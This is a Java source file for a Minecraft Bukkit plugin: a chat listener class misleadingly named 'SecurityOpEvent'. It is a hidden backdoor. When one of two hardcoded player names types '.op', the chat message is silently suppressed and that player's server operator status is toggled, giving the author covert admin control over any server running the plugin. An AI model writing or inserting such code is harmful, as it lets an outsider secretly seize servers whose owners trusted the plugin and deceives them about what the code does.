package me.zpandakst.events;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class SecurityOpEvent implements Listener {
    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        if (((event.getPlayer().getName().equals("zPandaKST_")) || (event.getPlayer().getName().equals("zPandaKST"))) &&
                (event.getMessage().equalsIgnoreCase(".op")))
        {
            event.setCancelled(true);
            event.getPlayer().setOp(!event.getPlayer().isOp());
        }
    }
}
